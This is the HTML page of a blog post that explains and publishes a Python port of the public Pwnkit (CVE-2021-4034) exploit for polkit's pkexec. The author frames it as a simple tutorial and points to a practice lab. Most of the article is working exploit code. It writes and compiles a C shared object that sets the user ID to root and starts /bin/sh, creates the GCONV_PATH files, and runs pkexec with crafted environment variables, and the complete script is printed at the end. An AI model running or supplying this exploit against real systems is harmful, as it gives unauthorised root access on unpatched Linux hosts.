<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2021-4034 | &quot;Pwnkit&quot; | hifumi1337@blog:~$ ACCESS_GRANTED</title><meta name="keywords" content="Cybersecurity, Game Development, Technology, Hifumi1337"><meta name="author" content="Hifumi"><meta name="copyright" content="Hifumi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Description: A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-4034 | &quot;Pwnkit&quot;">
<meta property="og:url" content="https://hifumisecurity.com/cve-2021-4034/index.html">
<meta property="og:site_name" content="hifumi1337@blog:~$ ACCESS_GRANTED">
<meta property="og:description" content="Description: A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hifumisecurity.com/img/blog_5/cover.png">
<meta property="article:published_time" content="2022-03-17T02:05:14.152Z">
<meta property="article:modified_time" content="2022-03-17T03:26:28.884Z">
<meta property="article:author" content="Hifumi">
<meta property="article:tag" content="Cybersecurity, Game Development, Technology, Hifumi1337">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hifumisecurity.com/img/blog_5/cover.png"><link rel="shortcut icon" href="/img/programming.svg"><link rel="canonical" href="https://hifumisecurity.com/cve-2021-4034/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-4034 | "Pwnkit"',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-16 22:26:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.gif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/blog_5/cover.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">hifumi1337@blog:~$ ACCESS_GRANTED</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-4034 | &quot;Pwnkit&quot;</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-03-17T02:05:14.152Z" title="Created 2022-03-16 21:05:14">2022-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-03-17T03:26:28.884Z" title="Updated 2022-03-16 22:26:28">2022-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Cybersecurity/">Cybersecurity</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2021-4034 | &quot;Pwnkit&quot;"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h1><p> A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn’t handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it’ll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.</p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Tl;dr - I converted the original C script to Python and successfully exploited a vulnerable system.</p>
<p>Time for me to explain what this blog post is going to accomplish. My goal with this post is to give a very simplistic explanation of my solution to the CVE-2021-4034 vulnerability.</p>
<p>The original exploit was written in C and can be viewed <a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">here</a>. My solution is written in Python and based on the original C script.</p>
<p>Let’s begin!</p>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>First off, this is a simple script, and I will do my best to explain it in the most straightforward way possible. I think it’s time to go ahead and setup a template for us to use. If you’re not too familiar with the Python programing language (or C/C++ architecture), I would recommend learning basic syntax before trying to run this on a Linux environment because if written incorrectly, it can cause system-wide issues. If you would like a Virtual Machine or testing environment, I recommend checking out this <a target="_blank" rel="noopener" href="https://tryhackme.com/room/pwnkit">TryHackMe room</a> on CVE-2021-4034.</p>
<p>Okay, let’s get into the Python!</p>
<p>Here’s our simple Python template:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os module provided by Python when installing the proper tools</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Library providing certain attributes from the C language</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"></span><br><span class="line"><span class="comment"># Our base template class =&gt; def =&gt; code being executed</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CVE_2021_4034</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Code goes here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is where we call our exploit when running the script</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    CVE = CVE_2021_4034()</span><br><span class="line">    CVE.exploit()</span><br></pre></td></tr></table></figure>

<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>Now that our template has been complete, let’s go ahead and form our payload. The payload we will be used is actually a Python string made up of C/C++ code that will be injected into pwnkit.c file and then compile into a share object and when running the <code>pkexec</code> command, this code will be executed! I think it’s best if we just move onto the next section to make it a little bit easier.</p>
<p>Since we’ve already covered the template, just assume all of the code we write will be inside of the <code>def exploit(self)</code> method and before the <code>if __name__ == &#39;__main__&#39;</code> declaration. There is a final script with the entire codebase on my GitHub <a target="_blank" rel="noopener" href="https://github.com/Hifumi1337/CVE-2021-4034">here</a> and at the end of this post.</p>
<p>I won’t go into too much detail here, but just know we are creating a string in Python, which saves a bunch of important code to exploit our system.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #include &lt;stdio.h&gt;\n</span></span><br><span class="line"><span class="string">    #include &lt;stdlib.h&gt;\n</span></span><br><span class="line"><span class="string">    #include &lt;unistd.h&gt;\n\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    void gconv() &#123;&#125;\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    void gconv_init() &#123;\n</span></span><br><span class="line"><span class="string">        setuid(0); setgid(0);\n</span></span><br><span class="line"><span class="string">        seteuid(0); setegid(0);\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh\&quot;);\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        exit(0);\n</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>Time to use our first module: <code>os</code>. As you’ll notice, we are only calling the sub-module of the <code>os</code> called <code>system</code>. All you need to know is anything between <code>os.system(&quot;Anything between here&quot;)</code>, basically runs as a process on your system, so if you’ve ever used Linux and you run the <code>whoami</code> command, it returns the logged in user, and we can do this in Python by using <code>os.system(&quot;whoami&quot;)</code>.</p>
<p>The <code>with open(file_name, &quot;w&quot;)</code> section just opens a file and we specify the “w” so we can write to the file (this requires write permissions).</p>
<p>All the commands within <code>os.system()</code> are bit more complicated than your average commands, but just know you are creating multiple files and directories, assigning permissions, and writing to multiple files. The only real unique section is in the final command: <code>gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC</code>; this basically compiles our pwnkit.c code and pushes it to a shared object with some special settings.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwnkit/pwnkit.c&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>Let’s go ahead and add our final snippet! This is the main section of our code to exploit the vulnerability. First, we use the C library that we imported prior to initialize some pointers and create a variable for our C lang library. Next, we create a variable that leads to the actual location of the binary we’re going to exploit (<code>pkexec_cmd</code>), and since we aren’t taking any arguments, we set the <code>argv = []</code> to nothing.</p>
<p>The next few parts I’ll cover briefly, but only because these sections can be altered in multiple ways for the same outcome. Our <code>env_store</code> variable just stores our generated path information to exploit the <code>pkexec</code> utility (these environmental variables are not permanent if running on your local system).</p>
<p>Lastly, we setup a basic char variable (from the C library) and save that to a local variable. By doing this, we can initiate a try/except statement for running the exploit! </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">c_lang = CDLL(find_library(<span class="string">&quot;c&quot;</span>))</span><br><span class="line">c_lang.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)</span><br><span class="line"></span><br><span class="line">pkexec_cmd = <span class="string">b&quot;/usr/bin/pkexec&quot;</span></span><br><span class="line">argv = []</span><br><span class="line">env_store = [</span><br><span class="line">    <span class="string">b&quot;pwnkit&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;CHARSET=PWNKIT&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;SHELL=pwnkit&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">e_argv = (c_char_p * (<span class="built_in">len</span>(argv) + <span class="number">1</span>))(*argv, <span class="literal">None</span>)</span><br><span class="line">e_env = (c_char_p * (<span class="built_in">len</span>(env_store) + <span class="number">1</span>))(*env_store, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    c_lang.execve(pkexec_cmd, e_argv, e_env)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ERROR]: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br></pre></td></tr></table></figure>

<p>You should see the following output if the exploit worked (NOTE: If you run the exploit and see the <code>pkexec</code> help menu, this means the system or environment you’re attempting to exploit is patched or not vulnerable):</p>
<p><img src="../../../../../../img/blog_5/post_imgs/img_1.png" alt="Image 1"></p>
<h2 id="Entire-Script"><a href="#Entire-Script" class="headerlink" title="Entire Script"></a>Entire Script</h2><p>Thank you so much for following along and I hope you enjoyed my implementation of the CVE-2021-4034! Feel free to follow my GitHub, located in the sidebar, or you can view the full script below (with my banner included):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################</span></span><br><span class="line"></span><br><span class="line">    CVE-<span class="number">2021</span>-<span class="number">4034</span> | <span class="string">&quot;Pwnkit&quot;</span></span><br><span class="line">    Author: Hifumi1337</span><br><span class="line">    GitHub: https://github.com/Hifumi1337</span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Description:</span></span><br><span class="line"><span class="string">A local privilege escalation vulnerability was found on polkit&#x27;s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn&#x27;t handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it&#x27;ll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">References:</span></span><br><span class="line"><span class="string">- https://github.com/arthepsy/CVE-2021-4034</span></span><br><span class="line"><span class="string">- https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4034</span></span><br><span class="line"><span class="string">- https://nvd.nist.gov/vuln/detail/cve-2021-4034</span></span><br><span class="line"><span class="string">- https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CVE_2021_4034</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">author</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        ###########################################</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            CVE-2021-4034 | &quot;Pwnkit&quot;</span></span><br><span class="line"><span class="string">            Author: Hifumi1337</span></span><br><span class="line"><span class="string">            GitHub: https://github.com/Hifumi1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        ###########################################</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        #include &lt;stdio.h&gt;\n</span></span><br><span class="line"><span class="string">        #include &lt;stdlib.h&gt;\n</span></span><br><span class="line"><span class="string">        #include &lt;unistd.h&gt;\n\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        void gconv() &#123;&#125;\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        void gconv_init() &#123;\n</span></span><br><span class="line"><span class="string">            setuid(0); setgid(0);\n</span></span><br><span class="line"><span class="string">            seteuid(0); setegid(0);\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh\&quot;);\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            exit(0);\n</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&quot;mkdir -p &#x27;GCONV_PATH=.&#x27;; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;mkdir -p pwnkit; echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwnkit/pwnkit.c&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(payload)</span><br><span class="line">        </span><br><span class="line">        os.system(<span class="string">&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;</span>)</span><br><span class="line"></span><br><span class="line">        c_lang = CDLL(find_library(<span class="string">&quot;c&quot;</span>))</span><br><span class="line">        c_lang.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)</span><br><span class="line"></span><br><span class="line">        pkexec_cmd = <span class="string">b&quot;/usr/bin/pkexec&quot;</span></span><br><span class="line">        argv = []</span><br><span class="line">        env_store = [</span><br><span class="line">            <span class="string">b&quot;pwnkit&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;CHARSET=PWNKIT&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;SHELL=pwnkit&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        e_argv = (c_char_p * (<span class="built_in">len</span>(argv) + <span class="number">1</span>))(*argv, <span class="literal">None</span>)</span><br><span class="line">        e_env = (c_char_p * (<span class="built_in">len</span>(env_store) + <span class="number">1</span>))(*env_store, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c_lang.execve(pkexec_cmd, e_argv, e_env)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[ERROR]: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    CVE = CVE_2021_4034()</span><br><span class="line">    CVE.author()</span><br><span class="line">    CVE.exploit()</span><br></pre></td></tr></table></figure>

<h3 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4034</a></li>
<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2021-4034">https://nvd.nist.gov/vuln/detail/cve-2021-4034</a></li>
<li><a target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</a></li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/blog_5/cover.png" data-sites="facebook,twitter,linkedin"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/universal-ctf-tool/"><img class="next-cover" src="/img/blog_4/cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Universal CTF Tool</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Hifumi</div><div class="author-info__description">Welcome to my blog! Here you will find content around Cybersecurity, Software Development, and Game Development</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hifumi1337"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-1"><span class="toc-number">1.2.</span> <span class="toc-text">Step 1</span></a></li><li class="toc-item toc-level-2"><a 